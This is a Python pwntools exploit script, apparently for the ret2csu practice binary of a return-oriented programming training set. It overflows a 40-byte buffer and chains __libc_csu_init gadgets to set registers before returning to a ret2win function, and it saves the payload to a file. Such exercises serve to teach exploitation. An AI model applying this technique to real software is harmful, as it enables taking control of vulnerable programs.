from pwn import *
import gadgets

binary = './ret2csu'
padding = 40

ptr_init = 0x00600e38
ret2win = 0x004007b1

payload = b''


#  payload += p64(0x000000000040064d) # pop rax; adc byte ptr [rax], ah; jmp rax;
payload += p64(0x0040089a) # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(ptr_init) # r12
payload += p64(0) # r13
payload += p64(1) # r14
payload += p64(0xdeadcafebabebeef) # r15
payload += p64(0x00400880)

payload += p64(0) * 7
payload += p64(ret2win)

# end of content
p = process(binary)
p.sendline(padding * b'a' + payload)
#  p.interactive()
p.wait()
print(p.recvall().decode())

with open('payload.bin', 'wb') as f:
    f.write(padding * b'a' + payload + b'\n')
